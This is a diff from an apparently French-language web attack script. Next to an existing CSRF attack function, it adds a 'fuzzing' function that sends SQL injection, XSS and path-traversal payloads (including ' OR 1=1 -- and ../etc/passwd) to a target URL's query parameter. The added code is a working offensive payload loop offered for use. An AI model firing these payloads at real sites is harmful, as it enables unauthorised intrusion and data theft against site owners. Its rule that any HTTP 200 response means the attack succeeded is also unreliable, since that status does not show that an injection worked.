@@ -142,3 +142,23 @@ def csrf_attack(url, post_data=None):
             print(colored("[-] L'attaque CSRF a échoué.", "red"))
     except requests.exceptions.RequestException as e:
         print(colored(f"[!] Erreur lors de l'attaque CSRF : {e}", "red"))
+
+# Ajouter la fonctionnalité de fuzzing
+def fuzzing_attack(url):
+    print(colored("[*] Lancement de l'attaque de fuzzing...", "yellow"))
+    fuzz_data = [
+        "' OR 1=1 --", 
+        "<script>alert('XSS')</script>", 
+        "../etc/passwd", 
+        "admin' OR 1=1 --"
+    ]
+    for data in fuzz_data:
+        try:
+            response = requests.get(url, params={"input": data}, timeout=10)
+            print(f"Test de fuzzing avec : {data} - Statut : {response.status_code}")
+            if response.status_code == 200:
+                print(colored(f"[+] Fuzzing réussi avec : {data}", "green"))
+            else:
+                print(colored(f"[-] Fuzzing échoué avec : {data}", "red"))
+        except requests.exceptions.RequestException as e:
+            print(colored(f"[!] Erreur lors du fuzzing : {e}", "red"))
